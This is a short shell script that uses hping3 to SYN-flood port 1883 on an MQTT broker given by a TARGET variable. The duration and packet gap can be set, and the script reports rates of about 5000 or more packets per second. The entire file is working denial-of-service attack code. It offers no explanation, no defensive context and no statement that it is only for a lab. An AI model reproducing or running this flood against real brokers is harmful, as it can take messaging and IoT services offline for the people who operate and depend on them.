#!/bin/sh
# SYN flood against the broker's MQTT port. Usage: syn_flood [seconds] [microseconds between packets]
SECS=${1:-10}; GAP=${2:-120}
echo "SYN flood -> $TARGET:1883 for ${SECS}s (gap ${GAP}us, ~5000+ packets/s)"
timeout "$SECS" hping3 -S -p 1883 -i u"$GAP" "$TARGET" >/dev/null 2>&1
echo "done"
